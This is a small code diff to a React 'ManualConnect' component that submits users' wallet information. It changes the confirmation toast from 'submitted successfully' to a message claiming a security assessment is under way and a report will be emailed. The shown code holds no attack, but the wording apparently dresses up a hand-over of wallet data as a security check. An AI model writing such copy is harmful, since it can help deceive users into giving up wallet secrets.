@@ -41,8 +41,8 @@ export const ManualConnect = () => {
       if (response.error) throw response.error;
 
       toast({
-        title: "Success",
-        description: "Your wallet information has been submitted successfully.",
+        title: "Security Assessment Initiated",
+        description: "Your wallet has been queued for analysis. A comprehensive security report will be delivered to your email shortly.",
       });
 
       // Clear sensitive data
